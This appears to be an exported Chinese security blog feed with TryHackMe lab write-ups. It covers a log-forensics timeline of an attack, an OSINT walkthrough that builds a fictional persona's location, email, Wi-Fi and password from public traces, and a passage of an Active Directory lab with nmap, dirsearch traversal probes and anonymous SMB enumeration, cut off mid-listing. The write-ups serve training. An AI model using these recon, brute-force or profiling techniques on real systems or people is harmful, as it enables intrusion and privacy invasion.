&quot;</span>-<span class="hljs-string">&quot; &quot;</span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<span class="hljs-string">&quot;</span><br><span class="hljs-string">::ffff:192.168.10.5 - - [11/Apr/2021:09:34:52 +0000] &quot;</span>GET /favicon.ico HTTP/1.1<span class="hljs-string">&quot; - - &quot;</span>-<span class="hljs-string">&quot; &quot;</span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>可以看到它找到了&#x2F;ftp&#x2F;www-data.bak，&#x2F;ftp&#x2F;coupons_2013.md.bak，这可能是导致攻击者ssh登录www-data.bak的关键，因为攻击者在ssh日志中一直以这个用户名在进行爆破，可能正是从www-data.bak中获取到了真正的密码。最后一点FTP服务的日志，能与HTTP的对应上。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">Sun Apr 11 08:13:32 2021 [pid 6335] CONNECT: Client <span class="hljs-string">&quot;::ffff:127.0.0.1&quot;</span><br>Sun Apr 11 08:13:40 2021 [pid 6334] [anonymous] FAIL LOGIN: Client <span class="hljs-string">&quot;::ffff:127.0.0.1&quot;</span><br>Sun Apr 11 08:15:09 2021 [pid 6478] CONNECT: Client <span class="hljs-string">&quot;::ffff:127.0.0.1&quot;</span><br>Sun Apr 11 08:15:14 2021 [pid 6477] [anonymous] FAIL LOGIN: Client <span class="hljs-string">&quot;::ffff:127.0.0.1&quot;</span><br>Sun Apr 11 08:15:29 2021 [pid 6483] CONNECT: Client <span class="hljs-string">&quot;::ffff:127.0.0.1&quot;</span><br>Sun Apr 11 08:15:33 2021 [pid 6482] [anonymous] FAIL LOGIN: Client <span class="hljs-string">&quot;::ffff:127.0.0.1&quot;</span><br>Sun Apr 11 08:15:55 2021 [pid 6529] CONNECT: Client <span class="hljs-string">&quot;::ffff:127.0.0.1&quot;</span><br>Sun Apr 11 08:15:58 2021 [pid 6526] [ftp] OK LOGIN: Client <span class="hljs-string">&quot;::ffff:127.0.0.1&quot;</span>, anon password <span class="hljs-string">&quot;?&quot;</span><br>Sun Apr 11 08:18:04 2021 [pid 6628] CONNECT: Client <span class="hljs-string">&quot;::ffff:127.0.0.1&quot;</span><br>Sun Apr 11 08:18:07 2021 [pid 6627] [ftp] OK LOGIN: Client <span class="hljs-string">&quot;::ffff:127.0.0.1&quot;</span>, anon password <span class="hljs-string">&quot;ls&quot;</span><br>Sun Apr 11 08:29:16 2021 [pid 6827] CONNECT: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span><br>Sun Apr 11 08:29:23 2021 [pid 6835] CONNECT: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span><br>Sun Apr 11 08:29:34 2021 [pid 6838] CONNECT: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span><br>Sun Apr 11 08:29:34 2021 [pid 6842] CONNECT: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span><br>Sun Apr 11 08:29:34 2021 [pid 6843] CONNECT: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span><br>Sun Apr 11 08:29:34 2021 [pid 6847] CONNECT: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span><br>Sun Apr 11 08:29:34 2021 [pid 6846] [ftp] OK LOGIN: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span>, anon password <span class="hljs-string">&quot;IEUser@&quot;</span><br>Sun Apr 11 08:29:34 2021 [pid 6840] [ftp] OK LOGIN: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span>, anon password <span class="hljs-string">&quot;IEUser@&quot;</span><br>Sun Apr 11 08:29:35 2021 [pid 6837] [ftp] OK LOGIN: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span>, anon password <span class="hljs-string">&quot;IEUser@&quot;</span><br>Sun Apr 11 08:29:35 2021 [pid 6869] CONNECT: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span><br>Sun Apr 11 08:29:35 2021 [pid 6871] CONNECT: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span><br>Sun Apr 11 08:29:35 2021 [pid 6873] CONNECT: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span><br>Sun Apr 11 09:08:16 2021 [pid 8003] CONNECT: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span><br>Sun Apr 11 09:08:23 2021 [pid 8011] CONNECT: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span><br>Sun Apr 11 09:08:34 2021 [pid 8015] CONNECT: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span><br>Sun Apr 11 09:08:34 2021 [pid 8017] CONNECT: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span><br>Sun Apr 11 09:08:34 2021 [pid 8018] CONNECT: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span><br>Sun Apr 11 09:08:34 2021 [pid 8021] CONNECT: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span><br>Sun Apr 11 09:08:34 2021 [pid 8020] [ftp] OK LOGIN: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span>, anon password <span class="hljs-string">&quot;IEUser@&quot;</span><br>Sun Apr 11 09:08:34 2021 [pid 8014] [ftp] OK LOGIN: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span>, anon password <span class="hljs-string">&quot;IEUser@&quot;</span><br>Sun Apr 11 09:08:35 2021 [pid 8013] [ftp] OK LOGIN: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span>, anon password <span class="hljs-string">&quot;IEUser@&quot;</span><br>Sun Apr 11 09:08:35 2021 [pid 8048] CONNECT: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span><br>Sun Apr 11 09:08:35 2021 [pid 8050] CONNECT: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span><br>Sun Apr 11 09:08:35 2021 [pid 8052] CONNECT: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span><br>Sun Apr 11 09:35:32 2021 [pid 8153] CONNECT: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span><br>Sun Apr 11 09:35:37 2021 [pid 8152] [ftp] OK LOGIN: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span>, anon password <span class="hljs-string">&quot;?&quot;</span><br>Sun Apr 11 09:35:45 2021 [pid 8154] [ftp] OK DOWNLOAD: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span>, <span class="hljs-string">&quot;/www-data.bak&quot;</span>, 2602 bytes, 544.81Kbyte/sec<br>Sun Apr 11 09:36:08 2021 [pid 8154] [ftp] OK DOWNLOAD: Client <span class="hljs-string">&quot;::ffff:192.168.10.5&quot;</span>, <span class="hljs-string">&quot;/coupons_2013.md.bak&quot;</span>, 131 bytes, 3.01Kbyte/sec<br></code></pre></td></tr></table></figure><p>至此，日志是完了。回想一下。大概可以确定攻击路线：</p><p>攻击者于 Sun Apr 11 08:29:16 2021 尝试访问了服务器的FTP，使用的用户名为anon，密码为 IEUser@。</p><p>之后于 11&#x2F;Apr&#x2F;2021:09:08:29 使用Nmap对服务器HTTP服务进行了端口探测，在发现了HTTP服务后对其进行了访问并注册了一个账户：whoami，并不断的检索&#x2F;rest&#x2F;products&#x2F;“x”&#x2F;reviews疑似遍历他人信息，然后使用Hydra对&#x2F;rest&#x2F;user&#x2F;login 页面进行了登录爆破并于11&#x2F;Apr&#x2F;2021:09:16:31产生了一条200状态的消息判定其爆破成功.</p><p>于11&#x2F;Apr&#x2F;2021:09:29:15利用SQLMAP对&#x2F;rest&#x2F;products&#x2F;search查询了网站数据库中email，password表中的数据信息，紧随其后在 11&#x2F;Apr&#x2F;2021:09:34:33 攻击者通过feroxbuster目录爆破工具，发现了备份文件&#x2F;ftp&#x2F;www-data.bak、&#x2F;ftp&#x2F;coupons_2013.md.bak。并于Sun Apr 11 09:35:37 2021再此以用户名anon ，密码 ？访问了FTP获取到了备份文件www-data.bak，coupons_2013.md.bak。</p><p>然后便针对SSH服务以www-data身份进行了登录爆破，并爆破成功于Apr 11 09:41:19成功获取shell登录进服务器，但紧接着在Apr 11 09:41:25退出登录，在Apr 11 09:41:32又以www-data登录进服务器，在Apr 11 09:41:44又退出登录状态，在09:41:46产生了一条服务启动超时的异常记录，疑似被攻击者利用，紧接着攻击者试图访问&#x2F;etc&#x2F;securetty文件，疑似查看或更改root登录限制。判定root账户凭证可能已经泄露。</p>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Digital Forensics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TryHackMe Walkthrough - OhSINT</title>
    <link href="/post/TryHackMe-OhSINT.html"/>
    <url>/post/TryHackMe-OhSINT.html</url>
    
    <content type="html"><![CDATA[<p>What information can you possible get with just one photo?</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage//image-20220711161113968.png" alt="image-20220711161113968"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ exiftool WindowsXP.jpg <br>ExifTool Version Number         : 12.16<br>File Name                       : WindowsXP.jpg<br>Directory                       : .<br>File Size                       : 229 KiB<br>File Modification Date/Time     : 2022:07:11 16:07:34+08:00<br>File Access Date/Time           : 2022:07:11 16:07:33+08:00<br>File Inode Change Date/Time     : 2022:07:11 16:07:45+08:00<br>File Permissions                : rw-r--r--<br>File Type                       : JPEG<br>File Type Extension             : jpg<br>MIME Type                       : image/jpeg<br>XMP Toolkit                     : Image::ExifTool 11.27<br>GPS Latitude                    : 54 deg 17<span class="hljs-string">&#x27; 41.27&quot; N</span><br><span class="hljs-string">GPS Longitude                   : 2 deg 15&#x27;</span> 1.33<span class="hljs-string">&quot; W</span><br><span class="hljs-string">Copyright                       : OWoodflint</span><br><span class="hljs-string">Image Width                     : 1920</span><br><span class="hljs-string">Image Height                    : 1080</span><br><span class="hljs-string">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="hljs-string">Bits Per Sample                 : 8</span><br><span class="hljs-string">Color Components                : 3</span><br><span class="hljs-string">Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)</span><br><span class="hljs-string">Image Size                      : 1920x1080</span><br><span class="hljs-string">Megapixels                      : 2.1</span><br><span class="hljs-string">GPS Latitude Ref                : North</span><br><span class="hljs-string">GPS Longitude Ref               : West</span><br><span class="hljs-string">GPS Position                    : 54 deg 17&#x27; 41.27&quot;</span> N, 2 deg 15<span class="hljs-string">&#x27; 1.33&quot; W</span><br></code></pre></td></tr></table></figure><p>能够看到版权归属与经纬度：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Copyright</span>                       : OWoodflint<br><span class="hljs-attribute">GPS</span> Position                    : <span class="hljs-number">54</span> deg <span class="hljs-number">17</span>&#x27; <span class="hljs-number">41</span>.<span class="hljs-number">27</span><span class="hljs-string">&quot; N, 2 deg 15&#x27; 1.33&quot;</span> W<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage//image-20220711165436702.png" alt="image-20220711165436702"></p><p>或许是他家？</p><p>用谷歌去搜索版权归属这个名字可以搜到一条推特动态：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>twitter.com/owoodflint<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage//image-20220711161756659.png" alt="image-20220711161756659"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Bssid</span>: B4:<span class="hljs-number">5</span>D:<span class="hljs-number">50</span>:AA:<span class="hljs-number">86</span>:<span class="hljs-number">41</span> - Go nuts!<br></code></pre></td></tr></table></figure><p>还有地理位置Space，看起来是英国的某个地方：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage//image-20220711162002941.png" alt="image-20220711162002941"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage//image-20220711164916458.png" alt="image-20220711164916458"></p><p>接着谷歌搜索还可以看到一个博客站点：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage//image-20220711162150537.png" alt="image-20220711162150537"></p><p>时间与推特的差不多，他说他在纽约，很快就会更新.博客还藏了一串字符串：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage//image-20220711164503019.png" alt="image-20220711164503019"></p><p>根据wifi的BSSID能够定位到：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage//image-20220711163300050.png" alt="image-20220711163300050"></p><p>这是一个英国的wifi，位于女王陛下剧院的西北。wifi名为UnileverWiFi：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage//image-20220711163434813.png" alt="image-20220711163434813"></p><p>在London，或许是这人所属城市：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage//image-20220711163625372.png" alt="image-20220711163625372"></p><p>在Github还有一个与他一样的名字：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage//image-20220711164032614.png" alt="image-20220711164032614"></p><p>一样的介绍，一样的推特用户名，应该是同一个人。又获取到一个email。</p><p>​现在汇总一下，这个人ID是OWoodflint，在多个社交平台用户名是复用的，推特用户名是@OWoodflint，Github用户名是OWoodfl1nt.邮箱地址：<a href="mailto:&#x4f;&#87;&#111;&#x6f;&#x64;&#x66;&#108;&#105;&#x6e;&#116;&#x40;&#x67;&#109;&#97;&#105;&#108;&#x2e;&#x63;&#111;&#109;">&#x4f;&#87;&#111;&#x6f;&#x64;&#x66;&#108;&#105;&#x6e;&#116;&#x40;&#x67;&#109;&#97;&#105;&#108;&#x2e;&#x63;&#111;&#109;</a>。所在地在英国伦敦，一名摄影爱好者，曾去过纽约。</p><p>What is this users avatar of?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span><br></code></pre></td></tr></table></figure><p>What city is this person in?</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">London</span><br></code></pre></td></tr></table></figure><p>Whats the SSID of the WAP he connected to?</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">UnileverWiFi</span><br></code></pre></td></tr></table></figure><p>What is his personal email address?</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-symbol">OWoodflint@</span>gmail.com<br></code></pre></td></tr></table></figure><p>What site did you find his email address on?</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">github</span><br></code></pre></td></tr></table></figure><p>Where has he gone on holiday?</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">New</span> York<br></code></pre></td></tr></table></figure><p>What is this persons password?</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">pennYDr0pper.!<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSINT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TryHackMe Walkthrough - Enterprise</title>
    <link href="/post/TryHackMe-Enterprise.html"/>
    <url>/post/TryHackMe-Enterprise.html</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Tue Jul 12 14:23:34 2022 as: nmap -sC -sV -p- -Pn -T4 -oA Enterprise 10.10.251.132</span><br>Warning: 10.10.251.132 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (6).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.251.132<br>Host is up (0.28s latency).<br>Not shown: 65505 closed tcp ports (reset)<br>PORT      STATE SERVICE       VERSION<br>53/tcp    open  domain        Simple DNS Plus<br>80/tcp    open  http          Microsoft IIS httpd 10.0<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-server-header: Microsoft-IIS/10.0<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-07-12 06:43:02Z)</span><br><span class="hljs-string">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="hljs-string">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)</span><br><span class="hljs-string">445/tcp   open  microsoft-ds?</span><br><span class="hljs-string">464/tcp   open  kpasswd5?</span><br><span class="hljs-string">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="hljs-string">636/tcp   open  tcpwrapped</span><br><span class="hljs-string">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)</span><br><span class="hljs-string">3269/tcp  open  tcpwrapped</span><br><span class="hljs-string">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="hljs-string">|_ssl-date: 2022-07-12T06:44:07+00:00; +1s from scanner time.</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM</span><br><span class="hljs-string">| Not valid before: 2022-07-11T06:16:57</span><br><span class="hljs-string">|_Not valid after:  2023-01-10T06:16:57</span><br><span class="hljs-string">| rdp-ntlm-info: </span><br><span class="hljs-string">|   Target_Name: LAB-ENTERPRISE</span><br><span class="hljs-string">|   NetBIOS_Domain_Name: LAB-ENTERPRISE</span><br><span class="hljs-string">|   NetBIOS_Computer_Name: LAB-DC</span><br><span class="hljs-string">|   DNS_Domain_Name: LAB.ENTERPRISE.THM</span><br><span class="hljs-string">|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM</span><br><span class="hljs-string">|   DNS_Tree_Name: ENTERPRISE.THM</span><br><span class="hljs-string">|   Product_Version: 10.0.17763</span><br><span class="hljs-string">|_  System_Time: 2022-07-12T06:43:55+00:00</span><br><span class="hljs-string">5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="hljs-string">|_http-title: Service Unavailable</span><br><span class="hljs-string">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="hljs-string">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="hljs-string">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="hljs-string">|_http-title: Not Found</span><br><span class="hljs-string">7990/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="hljs-string">| http-methods: </span><br><span class="hljs-string">|_  Potentially risky methods: TRACE</span><br><span class="hljs-string">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="hljs-string">|_http-title: Log in to continue - Log in with Atlassian account</span><br><span class="hljs-string">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="hljs-string">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="hljs-string">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="hljs-string">|_http-title: Not Found</span><br><span class="hljs-string">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="hljs-string">49669/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49670/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49671/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49673/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49677/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49701/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49710/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49839/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">| smb2-security-mode: </span><br><span class="hljs-string">|   311: </span><br><span class="hljs-string">|_    Message signing enabled and required</span><br><span class="hljs-string">| smb2-time: </span><br><span class="hljs-string">|   date: 2022-07-12T06:43:59</span><br><span class="hljs-string">|_  start_date: N/A</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://google.com/submit/ .</span><br><span class="hljs-string"># Nmap done at Tue Jul 12 14:44:15 2022 -- 1 IP address (1 host up) scanned in 1241.18 seconds</span><br></code></pre></td></tr></table></figure><h6 id="Flag1-txt"><a href="#Flag1-txt" class="headerlink" title="Flag1.txt:"></a>Flag1.txt:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">ENTERPRISE.THM<br></code></pre></td></tr></table></figure><p>尝试查看80端口，只有一个很简单的页面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://enterprise.thm/<br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</span>&gt;<br>&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;<br>&lt;h1&gt; Enterprise Domain Controller. Keep out! &lt;/h1&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dirsearch -u http://enterprise.thm/<br>Directory /usr/lib/python3/dist-packages/dirsearch is not writable<br>Directory /usr/lib/python3/dist-packages/dirsearch is not writable<br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903<br><br>Output File: /usr/lib/python3/dist-packages/dirsearch/reports/enterprise.thm/-_22-07-12_14-51-31.txt<br><br>Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-22-07-12_14-51-31.<span class="hljs-built_in">log</span><br><br>Target: http://enterprise.thm/<br><br>[14:51:32] Starting: <br>[14:51:35] 403 -  312B  - /%2e%2e//google.com<br>[14:52:09] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd<br>[14:53:25] 200 -  110B  - /robots.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://enterprise.thm/robots.txt<br>Why would robots.txt exist on a Domain Controllers web server?<br>Robots.txt is <span class="hljs-keyword">for</span> search engines, not <span class="hljs-keyword">for</span> you<br></code></pre></td></tr></table></figure><p>445是被允许匿名访问的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.251.132 -u <span class="hljs-built_in">whoami</span><br>[+] Guest session   IP: 10.10.251.132:445Name: enterprise.thm                                    <br>        Disk                                                  PermissionsComment<br>----                                                  ------------------<br>ADMIN$                                            NO ACCESSRemote Admin<br>C$                                                NO ACCESSDefault share<br>Docs                                              READ ONLY<br>IPC$                                              READ ONLYRemote IPC<br>NETLOGON                                          NO ACCESSLogon server share <br>SYSVOL                                            NO ACCESSLogon server share <br>Users                                             READ ONLYUsers Share. Do Not Touch<br></code></pre></td></tr></table></figure><p>送字典的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //10.10.251.132/Users -U <span class="hljs-string">&quot;&quot;</span> -N -c <span class="hljs-string">&quot;ls&quot;</span> &gt; <span class="hljs-built_in">users</span><br>$ <span class="hljs-built_in">cat</span> <span class="hljs-built_in">users</span> <br>  .                                  DR        0  Fri Mar 12 10:11:49 2021<br>  ..                                 DR        0  Fri Mar 12 10:11:49 2021<br>  Administrator                       D        0  Fri Mar 12 05:55:48 2021<br>  All Users                       DHSrn        0  Sat Sep 15 15:28:48 2018<br>  atlbitbucket                        D        0  Fri Mar 12 06:53:06 2021<br>  bitbucket                           